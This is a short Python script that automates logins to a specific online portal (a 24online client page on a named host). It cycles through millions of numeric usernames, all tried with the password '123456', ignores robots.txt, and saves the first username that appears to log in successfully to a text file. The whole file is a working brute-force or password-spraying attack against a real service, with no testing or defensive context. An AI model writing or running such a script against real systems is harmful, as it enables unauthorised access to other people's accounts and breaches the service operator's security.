import mechanize
from BeautifulSoup	import BeautifulSoup


class SanitizeHandler(mechanize.BaseHandler):
	def http_response(self, request, response):
		if not hasattr(response, "seek"):
			response = mechanize.response_seek_wrapper(response)

		if response.info().dict.has_key('content-type') and ('html' in response.info().dict['content-type']):
			soup = BeautifulSoup(response.get_data())
			response.set_data(soup.prettify())
		return response


filename = "Usrnm.txt"

br = mechanize.Browser()
br.add_handler(SanitizeHandler())
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

br.open("https://mahe3.dvois.com/24online/webpages/client.jsp")
#for num in range(160945452,161020000):#lower cap, upper cap
for num in range(170907389, 180907389):
		try:
			n=str(num)
			#print(n)
			br.select_form(nr=0)
			br.form['username'] = n		
			br.form['password']  = '123456'
			response=br.submit()
			#print("Done")			
			
		except:
			target = open(filename, 'a')
			n=int(n)-1
			n=str(n)
			target.write(n)
			target.write("\n")				
			break;